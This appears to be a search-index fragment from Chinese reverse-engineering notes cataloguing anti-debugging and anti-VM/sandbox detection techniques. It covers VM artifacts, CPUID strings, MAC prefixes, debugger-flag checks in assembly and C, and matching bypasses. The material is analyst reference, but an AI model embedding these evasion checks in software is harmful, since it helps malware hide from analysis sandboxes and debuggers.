\\\\.\\HGFS \\\\.\\vmci \u68c0\u67e5\u7279\u5b9a\u547d\u540d\u7ba1\u9053 NtCreateFile VirtualBox \\\\.\\pipe\\VBoxMiniRdDN \\\\.\\pipe\\VBoxTrayIPC \u68c0\u67e5\u5168\u5c40\u5bf9\u8c61 NtOpenDirectoryObject NtQueryDirectoryObject Hyper-V VmGenerationCounter \\Device Parallels prl_pv \\Device prl_tg \\Device prl_time \\Device Sandboxie SandboxieDriverApi \\Device SbieDrv \\Driver SbieSvcPort \\RPC Control VirtualBox VBoxGuest \\Device VBoxMiniRdr \\Device VBoxVideo \\Driver VBoxMouse \\Driver VirtualPC VirtualMachineServices \\Device 1-driver-vmsrvc \\Driver VMware vmmemctl \\Device \u68c0\u67e5\u5bf9\u8c61\u76ee\u5f55\uff08\u4ec5\u9650Sandboxie\uff09 GetFileAttributes \\Sandbox \u68c0\u67e5\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u662f\u5426\u5b58\u5728\u865a\u62df\u6ce8\u518c\u8868\uff08\u4ec5\u9650Sandboxie\uff09 \u7528\u6237\u754c\u9762\u7ec4\u4ef6 FindWindow \u68c0\u67e5\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u662f\u5426\u5b58\u5728\u5177\u6709\u7279\u5b9a\u7c7b\u540d\u79f0\u7684\u7a97\u53e3 \u68c0\u67e5\u9876\u5c42\u7a97\u53e3\u6570\u91cf\u662f\u5426\u592a\u5c0f \u7cfb\u7edf\u529f\u80fd \u8fd9\u5c31\u6709\u70b9\u590d\u6742\u4e86 CreateToolhelp32Snapshot psapi.EnumProcesses (WinXP, Vista) kernel32.EnumProcesses \u68c0\u67e5\u8c03\u8bd5\u6743\u9650 \u4f7f\u7528\u4e0d\u5e73\u8861\u6808 \u8fdb\u7a0b \u68c0\u67e5\u8fd0\u884c\u7684\u7279\u5b9a\u8fdb\u7a0b CreateToolhelp32Snapshot psapi.EnumProcesses _(WinXP, Vista)_ kernel32.EnumProcesses _(Win7+)_ JoeBox joeboxserver.exe joeboxcontrol.exe Parallels prl_cc.exe prl_tools.exe VirtualBox vboxservice.exe vboxtray.exe VirtualPC vmsrvc.exe vmusrvc.exe VMware vmtoolsd.exe vmacthlp.exe vmwaretray.exe vmwareuser.exe vmware.exe vmount2.exe Xen xenservice.exe xsvc_depriv.exe WPE Pro WPE Pro.exe \u68c0\u67e5\u8fd0\u884c\u7a7a\u95f4\u52a0\u8f7d\u7684\u7279\u5b9a\u5e93 GetModuleHandle CWSandbox api_log.dll dir_watch.dll pstorec.dll Sandboxie sbiedll.dll ThreatExpert dbghelp.dll VirtualPC vmcheck.dll WPE Pro wpespy.dll \u68c0\u67e5\u7279\u5b9a\u5e93\u4e2d\u662f\u5426\u5b58\u5728\u7279\u5b9a\u51fd\u6570 kernel32.GetProcAddress kernel32.LdrGetProcedureAddress _(called internally)_ ntdll.LdrGetProcedureAddress ntdll.LdrpGetProcedureAddress _(called internally)_ Wine kernel32.dll wine_get_unix_file_name ntdll.dll wine_get_version \u68c0\u67e5\u662f\u5426\u53ef\u4ee5\u52a0\u8f7d\u5176\u4ed6\u5e93 LoadLibraryA/W \u68c0\u67e5\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u4e2d\u662f\u5426\u5b58\u5728\u7279\u5b9a\u7ec4\u4ef6\uff08\u4ec5\u9650 Sandboxie\uff09 NtQueryVirtualMemory \u7f51\u7edc \u7279\u5b9a\u7f51\u7edc\u5c5e\u6027 \u68c0\u67e5\u7279\u5b9aMAC\u5730\u5740 GetAdaptersAddresses GetAdaptersInfo Parallels Parallels 00:1C:42 \\x00\\x1C\\x42 VirtualBox 08:00:27 \\x08\\x00\\x27 VMware 00:05:69 \\x00\\x05\\x69 00:0C:29 \\x00\\x0C\\x29 00:1C:14 \\x00\\x1C\\x14 00:50:56 \\x00\\x50\\x56 Xen 00:16:E3 \\x00\\x16\\xE3 \u68c0\u67e5\u9002\u914d\u5668\u7279\u5b9a\u540d\u79f0 GetAdaptersAddresses GetAdaptersInfo VMware Vmware \u68c0\u67e5\u7279\u5b9a\u7f51\u7edc\u5171\u4eab\u540d WNetGetProviderName VirtualBox VirtualBox Shared Folders \u68c0\u67e5\u7f51\u7edc\u662f\u5426\u5c5e\u4e8e\u5b89\u5168\u8fb9\u754c \u4e5f\u5c31\u662f\u8bf4\uff0c\u7279\u5b9a\u7684\u7f51\u7edc\u533a\u57df\u662f\u6c99\u7bb1\u7279\u6709\u7684\uff0c\u8bc6\u522b\u5230\u6c99\u7bb1\u7684\u7f51\u7edc\u540e\u5c31\u77e5\u9053\u8fd0\u884c\u5728\u6c99\u7bb1\u3002 \u56fd\u5916\u7684\u4e00\u4e9b\u6c99\u7bb1\u7f51\u7edc\u533a\u57df\u7279\u5f81\u4e0d\u8d34\u4e86\uff0c\u90a3\u5728\u4e2d\u56fd\u4e0d\u9002\u7528\u3002 \u57fa\u4e8e NetValidateName \u7ed3\u679c\u7684\u53cd\u6c99\u7bb1\u6280\u672f Initially this technique was designed for bypassing AV detection. It\u2019s not an evasion technique itself \u2014 instead it abuses interesting side-effects after the function is called. The main idea is to use the determined result of NetValidateName API function call with invalid argument as Server name (for example \u201c123\u201d) for calculating jump address dynamically. This jump usually points into the middle of some instruction to bypass heuristic analysis of AV software. But this technique also has (at least) one side-effect. If default NetBIOS settings are set in the operating system (NetBIOS over TCP/IP is enabled) the return code is always equal to ERROR_BAD_NETPATH (0x35). If NetBIOS over TCP/IP is switched off then return code is ERROR_NETWORK_UNREACHABLE (0x4CF). Thus jump address will be calculated incorrectly and it will lead the sample to crash. Therefore, this technique can be used to break emulation in sandboxes where NetBIOS over TCP/IP is switched off for preventing junk traffic generation by the OS. Note: NetBIOS over TCP/IP is switched off not to generate additional network requests when resolving server IP via DNS. Switching this option off cancels lookup requests in local network. \u7ffb\u8bd1\u4e4b\u540e\u5927\u610f\u662f \u4f7f\u7528 NetValidateName API\u6839\u636e \u4e3b\u673a\u662f\u5426\u662f\u9ed8\u8ba4\u7684NetBIOS\u914d\u7f6e \u3002\u662f\u4e0e\u5426\u7684\u8fd4\u56de\u7801\u4e0d\u540c\uff0c\u6839\u636e\u8fd4\u56de\u7801\u5224\u65ad\u662f\u5426\u6c99\u7bb1\u3002 \u57fa\u4e8eCuckoo ResultServer\u8fde\u63a5\u7684\u53cd\u6c99\u7bb1\u6280\u672f \u8be5\u6280\u672f\u53ef\u7528\u4e8e\u68c0\u6d4bCuckoo Sandbox\u865a\u62df\u73af\u5883\u3002 \u6076\u610f\u8f6f\u4ef6\u4f1a\u679a\u4e3e\u6240\u6709\u5df2\u5efa\u7acb\u7684\u4f20\u51fa TCP \u8fde\u63a5\uff0c\u5e76\u68c0\u67e5\u662f\u5426\u5b58\u5728\u4e0e Cuckoo ResultServer \u4f7f\u7528\u7684\u7279\u5b9a TCP \u7aef\u53e3 (2042) \u7684\u8fde\u63a5\u3002 \u9488\u5bf9\u7279\u5b9a\u7684\u6c99\u7bb1 CPU \u901a\u8fc7CPUID\u6307\u4ee4\u68c0\u67e5\u4f9b\u5e94\u5546ID\u5b57\u7b26\u4e32 \u865a\u62df\u673a\u7684CPUID\u6307\u4ee4\u6709\u7279\u5b9a\u7684\u6307\u7eb9 FreeBSD HV 0x40000000 bhyve bhyve Hyper-V 0x40000000 Microsoft Hv KVM 0x40000000 KVMKVMKVM Parallels 0x40000000 prl hyperv VirtualBox 0x40000000 VBoxVBoxVBox VirtualPC 0x40000000 Microsoft Hv VMware 0x40000000 VMwareVMware Xen 0x40000000 XenVMMXenVMM \u901a\u8fc7CPUID\u6307\u4ee4\u68c0\u67e5\u662f\u5426\u5728Hypervisor\u4e2d\u8fd0\u884c Hypervisor 1 31st bit in ECX - set if run in Hypervisor \u68c0\u67e5\u5168\u5c40\u8868\u4f4d\u7f6e\uff1aIDT/GDT/LDT \u9ad8\u7ea7 \u6b64\u6280\u672f\u4e0d\u9002\u7528\u4e8e\u6700\u65b0\u7684 VMware \u7248\u672c\uff08\u6240\u6709\u53d7\u5f71\u54cd\u7684 Windows \u7248\u672c\uff09\u3002 \u7136\u800c\uff0c\u4e3a\u4e86\u5b8c\u6574\u8d77\u89c1\uff0c\u5728\u6b64\u5bf9\u5176\u8fdb\u884c\u63cf\u8ff0\u3002 \u8fd9\u4e2a\u6280\u5de7\u6d89\u53ca\u67e5\u770b\u6307\u5411\u901a\u5e38\u5728\u865a\u62df\u673a\u4e0a\u91cd\u5b9a\u4f4d\u7684\u5173\u952e\u64cd\u4f5c\u7cfb\u7edf\u8868\u7684\u6307\u9488\u3002 \u8fd9\u5c31\u662f\u6240\u8c13\u7684\u201c\u7ea2\u8272\u836f\u4e38\u201d\uff0c\u7531 Joanna Rutkowska \u9996\u5148\u63d0\u51fa\u3002 \u6bcf\u4e2a CPU \u6709 1 \u4e2a\u672c\u5730\u63cf\u8ff0\u7b26\u8868\u5bc4\u5b58\u5668 (LDTR)\u30011 \u4e2a\u5168\u5c40\u63cf\u8ff0\u7b26\u8868\u5bc4\u5b58\u5668 (GDTR) \u548c 1 \u4e2a\u4e2d\u65ad\u63cf\u8ff0\u7b26\u8868\u5bc4\u5b58\u5668 (IDTR)\u3002 \u5f53\u6765\u5bbe\u64cd\u4f5c\u7cfb\u7edf\u8fd0\u884c\u65f6\uff0c\u5b83\u4eec\u5fc5\u987b\u79fb\u52a8\u5230\u4e0d\u540c\u7684\u4f4d\u7f6e\uff0c\u4ee5\u907f\u514d\u4e0e\u4e3b\u673a\u53d1\u751f\u51b2\u7a81\u3002 \u4f8b\u5982\uff0c\u5728\u771f\u5b9e\u673a\u5668\u4e0a\uff0cIDT \u5728\u5185\u5b58\u4e2d\u7684\u4f4d\u7f6e\u6bd4\u5728\u6765\u5bbe\uff08\u5373\u865a\u62df\uff09\u673a\u5668\u4e0a\u7684\u4f4d\u7f6e\u4f4e\u3002 \u4f7f\u7528\u5947\u5f02\u6307\u4ee4\u6765\u6b3a\u9a97\u865a\u62df\u6a21\u62df\u5668 MMX \u6307\u4ee4\u53ef\u80fd\u88ab\u6076\u610f\u8f6f\u4ef6\u7528\u4f5c\u968f\u673a\u6307\u4ee4\u3002 \u6709\u65f6\u865a\u62df\u673a\u4e0d\u652f\u6301\u6b64\u7c7b CPU \u6307\u4ee4\u5b50\u96c6\uff0c\u56e0\u6b64\u4f1a\u629b\u51fa\u5f02\u5e38\u800c\u4e0d\u662f\u6267\u884c\u5206\u6790\u3002 \u901a\u8fc7\u6267\u884c\u975e\u6cd5\u6307\u4ee4\u6765\u68c0\u6d4b\u73af\u5883\uff08\u4ec5\u9650\u865a\u62df PC\uff09 \u7279\u5b9a\u865a\u62df\u673a\uff0c\u7565\u8fc7 \u901a\u8fc7 IN \u6307\u4ee4\u68c0\u6d4b\u73af\u5883 - \u540e\u95e8\u7aef\u53e3\uff08\u4ec5\u9650 VMware\uff09 https://sites.google.com/site/chitchatvmback/backdoor \u786c\u4ef6 \u68c0\u67e5\u786c\u76d8\u7279\u5b9a\u540d\u79f0 SetupDiGetClassDevs SetupDiEnumDeviceInfo SetupDiGetDeviceRegistryProperty QEMU QEMU VirtualBox VBOX VirtualPC VIRTUAL HD VMware VMware \u68c0\u67e5\u786c\u76d8\u4f9b\u5e94\u5546\u7279\u5b9a\u503c DeviceIoControl VirtualBox VBOX VMware vmware \u68c0\u67e5\u97f3\u9891\u8bbe\u5907\u662f\u5426\u7f3a\u5931 \u68c0\u67e5CPU\u6e29\u5ea6\u4fe1\u606f\u662f\u5426\u5b58\u5728 wmic /namespace:\\\\root\\WMI path MSAcpi_ThermalZoneTemperature get CurrentTemperature \u68c0\u67e5d3d9\u786c\u4ef6\u663e\u793a\u63a5\u53e3 Direct3DCreate9 GetAdapterIdentifier Vmware VendorId 0x15AD DeviceId 0x405 Only when used in combination with VendorId related to VMware (0x15AD) Driver vm3dum.dll Driver vm3dum64_loader.dll Description VMware SVGA 3D","title":"\u53cd\u8c03\u8bd5\u4e0e\u53cd\u865a\u62df\u673a"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_1","text":"2023-10-27","title":"\u53cd\u8c03\u8bd5\u4e0e\u53cd\u865a\u62df\u673a"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_2","text":"https://anti-debug.checkpoint.com/","title":"\u53cd\u8c03\u8bd5"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_3","text":"","title":"\u53cd\u8c03\u8bd5\u6807\u5fd7\u4f4d"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#win32-api","text":"","title":"Win32 API"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#isdebuggerpresent","text":"\u51fd\u6570 kernel32!IsDebuggerPresent() \u786e\u5b9a\u5f53\u524d\u8fdb\u7a0b\u662f\u5426\u6b63\u5728\u7531\u7528\u6237\u6a21\u5f0f\u8c03\u8bd5\u5668\uff08\u4f8b\u5982 OllyDbg \u6216 x64dbg\uff09\u8fdb\u884c\u8c03\u8bd5\u3002 \u901a\u5e38\uff0c\u8be5\u51fd\u6570\u4ec5\u68c0\u67e5\u8fdb\u7a0b\u73af\u5883\u5757\uff08PEB\uff09\u7684 BeingDebugged \u6807\u5fd7\u3002 call IsDebuggerPresent test al, al jne being_debugged ... being_debugged: push 1 call ExitProcess if (IsDebuggerPresent()) ExitProcess(-1); \u53cd\u53cd\u8c03\u8bd5 \u5c06\u8fdb\u7a0b\u73af\u5883\u5757 (PEB) \u7684 BeingDebugged \u6807\u5fd7\u8bbe\u7f6e\u4e3a 0\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 BeingDebugged \u6807\u5fd7\u7f13\u89e3\u3002 \u4f7f\u7528syscallhide\u63d2\u4ef6\u3002","title":"IsDebuggerPresent"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#checkremotedebuggerpresent","text":"\u51fd\u6570 kernel32!CheckRemoteDebuggerPresent() \u68c0\u67e5\u8c03\u8bd5\u5668\uff08\u5728\u540c\u4e00\u53f0\u673a\u5668\u4e0a\u7684\u4e0d\u540c\u8fdb\u7a0b\u4e2d\uff09\u662f\u5426\u9644\u52a0\u5230\u5f53\u524d\u8fdb\u7a0b\u3002 BOOL bDebuggerPresent; if (TRUE == CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent) && TRUE == bDebuggerPresent) ExitProcess(-1); x86-64 lea rdx, [bDebuggerPresent] mov rcx, -1 ; GetCurrentProcess() call CheckRemoteDebuggerPresent cmp [bDebuggerPresent], 1 jz being_debugged ... being_debugged: mov ecx, -1 call ExitProcess \u53cd\u53cd\u8c03\u8bd5 \u5f53 CheckRemoteDebuggerPresent() \u8c03\u7528 NtQueryInformationProcess() \u65f6\uff0c\u552f\u4e00\u7684\u65b9\u6cd5\u662fhook NtQueryInformationProcess() \u5e76\u5728\u8fd4\u56de\u7f13\u51b2\u533a\u4e2d\u8bbe\u7f6e\u4ee5\u4e0b\u503c\uff1a - \u5982\u679c\u662f ProcessDebugPort \u67e5\u8be2\uff0c\u5219\u4e3a 0\uff08\u6216\u9664 -1 \u4e4b\u5916\u7684\u4efb\u4f55\u503c\uff09 - ProcessDebugFlags \u67e5\u8be2\u65f6\u4e3a\u975e\u96f6\u503c\u3002 - \u5982\u679c\u662f ProcessDebugObjectHandle \u67e5\u8be2\uff0c\u5219\u4e3a 0\u3002","title":"CheckRemoteDebuggerPresent()"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#ntqueryinformationprocess","text":"\u51fd\u6570 ntdll!NtQueryInformationProcess() \u53ef\u4ee5\u4ece\u8fdb\u7a0b\u4e2d\u68c0\u7d22\u4e0d\u540c\u7c7b\u578b\u7684\u4fe1\u606f\u3002 \u5b83\u63a5\u53d7 ProcessInformationClass \u53c2\u6570\uff0c\u8be5\u53c2\u6570\u6307\u5b9a\u60a8\u60f3\u8981\u83b7\u53d6\u7684\u4fe1\u606f\u5e76\u5b9a\u4e49 ProcessInformation \u53c2\u6570\u7684\u8f93\u51fa\u7c7b\u578b\u3002 \u7b2c\u4e00\u79cd\u68c0\u6d4b \u641c\u7d22 ProcessDebugPort \u7684\u503c\u662f\u5426\u4e3a 0xFFFFFFFF \uff0c\u5341\u8fdb\u5236 -1 x86-64 lea rcx, [dwReturned] push rcx ; ReturnLength mov r9d, 4 ; ProcessInformationLength lea r8, [dwProcessDebugPort] ; ProcessInformation mov edx, 7 ; ProcessInformationClass mov rcx, -1 ; ProcessHandle call NtQueryInformationProcess cmp dword ptr [dwProcessDebugPort], -1 jz being_debugged ... being_debugged: mov ecx, -1 call ExitProcess \u7b2c\u4e8c\u79cd\u68c0\u6d4b \u68c0\u6d4b ProcessDebugFlags \u7684\u503c\u662f\u5426\u4e3a 0x1f x86-64 lea rcx, [dwReturned] push rcx ; ReturnLength mov r9d, 4 ; ProcessInformationLength lea r8, [dwProcessDebugPort] ; ProcessInformation mov edx, 1Fh ; ProcessInformationClass mov rcx, -1 ; ProcessHandle call NtQueryInformationProcess cmp dword ptr [dwProcessDebugPort], 0 jz being_debugged ... being_debugged: mov ecx, -1 call ExitProcess \u7b2c\u4e09\u79cd\u68c0\u6d4b \u68c0\u6d4b ProcessDebugObjectHandle \u7684\u503c\u662f\u5426\u4e3a 0x1e x86-64 lea rcx, [dwReturned] push rcx ; ReturnLength mov r9d, 4 ; ProcessInformationLength lea r8, [hProcessDebugObject] ; ProcessInformation mov edx, 1Fh ; ProcessInformationClass mov rcx, -1 ; ProcessHandle call NtQueryInformationProcess cmp dword ptr [hProcessDebugObject], 0 jnz being_debugged ... being_debugged: mov ecx, -1 call ExitProcess \u53cd\u53cd\u8c03\u8bd5 \u540c\u4e0a","title":"NtQueryInformationProcess"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#rtlqueryprocessheapinformation","text":"ntdll!RtlQueryProcessHeapInformation() \u51fd\u6570\u53ef\u7528\u4e8e\u4ece\u5f53\u524d\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u5185\u5b58\u4e2d\u8bfb\u53d6\u5806\u6807\u5fd7\u3002 \u53cd\u53cd\u8c03\u8bd5 hook\u51fd\u6570\uff0c\u4fee\u6539\u8fd4\u56de\u503c - RTL_PROCESS_HEAPS::HeapInformation::Heaps[0]:: \u6807\u8bb0\u4e3a HEAP_GROWABLE","title":"RtlQueryProcessHeapInformation"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#rtlqueryprocessdebuginformation","text":"ntdll!RtlQueryProcessDebugInformation() \u51fd\u6570\u53ef\u7528\u4e8e\u4ece\u6240\u8bf7\u6c42\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u5185\u5b58\u4e2d\u8bfb\u53d6\u67d0\u4e9b\u5b57\u6bb5\uff0c\u5305\u62ec\u5806\u6807\u5fd7\u3002 \u53cd\u53cd\u8c03\u8bd5 hook\u51fd\u6570\uff0c\u4fee\u6539\u8fd4\u56de\u503c - RTL_PROCESS_HEAPS::HeapInformation::Heaps[0]:: \u6807\u8bb0\u4e3a HEAP_GROWABLE","title":"RtlQueryProcessDebugInformation"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#ntquerysysteminformation","text":"ntdll!NtQuerySystemInformation() \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u8be5\u53c2\u6570\u662f\u8981\u67e5\u8be2\u7684\u4fe1\u606f\u7684\u7c7b\u522b\u3002 \u5927\u591a\u6570\u6559\u7a0b\u90fd\u6ca1\u6709\u8bb0\u5f55\u3002 \u8fd9\u5305\u62ec SystemKernelDebuggerInformation (0x23) \u7c7b\uff0c\u8be5\u7c7b\u81ea Windows NT \u4ee5\u6765\u5c31\u5df2\u5b58\u5728\u3002 SystemKernelDebuggerInformation \u7c7b\u8fd4\u56de\u4e24\u4e2a\u6807\u5fd7\u7684\u503c\uff1aal \u4e2d\u7684 KdDebuggerEnabled \u548c ah \u4e2d\u7684 KdDebuggerNotPresent\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u5b58\u5728\u5185\u6838\u8c03\u8bd5\u5668\uff0cah \u4e2d\u7684\u8fd4\u56de\u503c\u4e3a\u96f6\u3002 \u53cd\u53cd\u8c03\u8bd5 hook\u51fd\u6570\uff0c\u4fee\u6539\u8fd4\u56de\u503c - SYSTEM_KERNEL_DEBUGGER_INFORMATION::DebuggerEnabled \u4e3a 0 \u4e14 SYSTEM_KERNEL_DEBUGGER_INFORMATION::DebuggerNotPresent \u4e3a 1","title":"NtQuerySystemInformation"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_4","text":"\u624b\u52a8\u53cd\u8c03\u8bd5\u662f\u5728\u4e0d\u9002\u7528API\u7684\u60c5\u51b5\u4e0b\u624b\u52a8\u4fee\u6539\u8c03\u8bd5\u6807\u5fd7","title":"\u624b\u52a8\u53cd\u8c03\u8bd5"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#beingdebugged-flag","text":"\u624b\u52a8\u4fee\u6539PEB\u7684 BeingDebugged x86-64 mov rax, gs:[60h] cmp byte ptr [rax+2], 0 jne being_debugged \u53cd\u53cd\u8c03\u8bd5 \u5c06 BeingDebugged \u6807\u5fd7\u8bbe\u7f6e\u4e3a 0","title":"BeingDebugged Flag"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#ntglobal-flag","text":"\u8fdb\u7a0b\u73af\u5883\u5757\u7684 NtGlobalFlag \u5b57\u6bb5\uff0832 \u4f4d Windows \u4e0a\u7684\u504f\u79fb\u91cf\u4e3a 0x68\uff0c64 \u4f4d Windows \u4e0a\u7684\u504f\u79fb\u91cf\u4e3a 0xBC\uff09\u9ed8\u8ba4\u4e3a 0\u3002 \u8fde\u63a5\u8c03\u8bd5\u5668\u4e0d\u4f1a\u66f4\u6539 NtGlobalFlag \u7684\u503c\u3002 \u4f46\u662f\uff0c\u5982\u679c\u8fdb\u7a0b\u662f\u7531\u8c03\u8bd5\u5668\u521b\u5efa\u7684\uff0c\u5219\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7\uff1a - FLG_HEAP_ENABLE_TAIL_CHECK (0x10) - FLG_HEAP_ENABLE_FREE_CHECK (0x20) - FLG_HEAP_VALIDATE_PARAMETERS (0x40) \u53ef\u4ee5\u901a\u8fc7\u68c0\u67e5\u8fd9\u4e9b\u6807\u5fd7\u7684\u7ec4\u5408\u6765\u68c0\u6d4b\u8c03\u8bd5\u5668\u7684\u5b58\u5728\u3002 mov rax, gs:[60h] mov al, [rax+BCh] and al, 70h cmp al, 70h jz being_debugged \u53cd\u53cd\u8c03\u8bd5 Set the NtGlobalFlag to 0","title":"NtGlobal Flag"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#heap-flag","text":"\u5806\u5305\u542b\u4e24\u4e2a\u53d7\u8c03\u8bd5\u5668\u5f71\u54cd\u7684\u5b57\u6bb5\u3002 \u5b83\u4eec\u5177\u4f53\u53d7\u5230\u7684\u5f71\u54cd\u53d6\u51b3\u4e8e Windows \u7248\u672c\u3002 \u8fd9\u4e9b\u5b57\u6bb5\u662f Flags \u548c ForceFlags\u3002 Flags \u548c ForceFlags \u7684\u503c\u901a\u5e38\u5206\u522b\u8bbe\u7f6e\u4e3a HEAP_GROWABLE \u548c 0\u3002 \u5728 64 \u4f4d Windows XP \u548c Windows Vista \u53ca\u66f4\u9ad8\u7248\u672c\u4e0a\uff0c\u5982\u679c\u5b58\u5728\u8c03\u8bd5\u5668\uff0c\u5219 Flags \u5b57\u6bb5\u5c06\u8bbe\u7f6e\u4e3a\u4ee5\u4e0b\u6807\u5fd7\u7684\u7ec4\u5408\uff1a - HEAP_GROWABLE (2) - HEAP_TAIL_CHECKING_ENABLED (0x20) - HEAP_FREE_CHECKING_ENABLED (0x40) - HEAP_VALIDATE_PARAMETERS_ENABLED (0x40000000) \u5f53\u5b58\u5728\u8c03\u8bd5\u5668\u65f6\uff0cForceFlags \u5b57\u6bb5\u8bbe\u7f6e\u4e3a\u4ee5\u4e0b\u6807\u5fd7\u7684\u7ec4\u5408\uff1a - HEAP_TAIL_CHECKING_ENABLED (0x20) - HEAP_FREE_CHECKING_ENABLED (0x40) - HEAP_VALIDATE_PARAMETERS_ENABLED (0x40000000) \u53cd\u53cd\u8c03\u8bd5 Set the Flags value to HEAP_GROWABLE, and the ForceFlags value to 0","title":"Heap Flag"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#heap-protection","text":"\u5982\u679c\u5728 NtGlobalFlag \u4e2d\u8bbe\u7f6e\u4e86 HEAP_TAIL_CHECKING_ENABLED \u6807\u5fd7\uff0c\u5219\u5e8f\u5217 0xABABABAB \u5c06\u9644\u52a0\u5728\u5206\u914d\u7684\u5806\u5757\u7684\u672b\u5c3e\uff08\u5728 32 \u4f4d Windows \u4e2d2\u6b21\uff0c\u5728 64 \u4f4d Windows \u4e2d\u9644\u52a0 4 \u6b21\uff09\u3002 \u5982\u679c\u5728 NtGlobalFlag \u4e2d\u8bbe\u7f6e\u4e86 HEAP_FREE_CHECKING_ENABLED \u6807\u5fd7\uff0c\u5219\u5982\u679c\u9700\u8981\u989d\u5916\u7684\u5b57\u8282\u6765\u586b\u5145\u76f4\u5230\u4e0b\u4e00\u4e2a\u5185\u5b58\u5757\u7684\u7a7a\u767d\u7a7a\u95f4\uff0c\u5219\u4f1a\u9644\u52a0\u5e8f\u5217 0xFEEEFEEE \u3002 \u53cd\u53cd\u8c03\u8bd5 \u5728\u5806\u540e\u624b\u52a8\u4fee\u8865 32 \u4f4d\u73af\u5883\u4e2d\u7684 12 \u4e2a\u5b57\u8282\u548c 64 \u4f4d\u73af\u5883\u4e2d\u7684 20 \u4e2a\u5b57\u8282\u3002 \u6302\u94a9 kernel32!HeapAlloc() \u5e76\u5728\u5206\u914d\u540e\u4fee\u8865\u5806\u3002","title":"Heap Protection"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#check-kuser_shared_data-structure","text":"\u8fd9\u662f\u9488\u5bf9 TitanHide \u8c03\u8bd5\u5668\u7684\u6f0f\u6d1e","title":"Check KUSER_SHARED_DATA structure"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_5","text":"\u57fa\u4e8e\u6807\u5fd7\u4f4d\u7684\u53cd\u8c03\u8bd5\u6280\u672f\u9664\u4e86 Heap Protection ,\u5176\u4ed6\u90fd\u53ef\u4ee5\u7528 syscallhide \u63d2\u4ef6\u89e3\u51b3","title":"\u7ed3\u8bba"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_6","text":"\u4ee5\u4e0b\u4e00\u7ec4\u6280\u672f\u4ee3\u8868\u4f7f\u7528\u5185\u6838\u5bf9\u8c61\u53e5\u67c4\u6765\u68c0\u6d4b\u8c03\u8bd5\u5668\u662f\u5426\u5b58\u5728\u7684\u68c0\u67e5\u3002 \u4e00\u4e9b\u63a5\u53d7\u5185\u6838\u5bf9\u8c61\u53e5\u67c4\u4f5c\u4e3a\u53c2\u6570\u7684 WinAPI \u51fd\u6570\u5728\u8c03\u8bd5\u65f6\u53ef\u80fd\u4f1a\u8868\u73b0\u4e0d\u540c\uff0c\u6216\u8005\u4f1a\u56e0\u8c03\u8bd5\u5668\u7684\u5b9e\u73b0\u800c\u4ea7\u751f\u526f\u4f5c\u7528\u3002 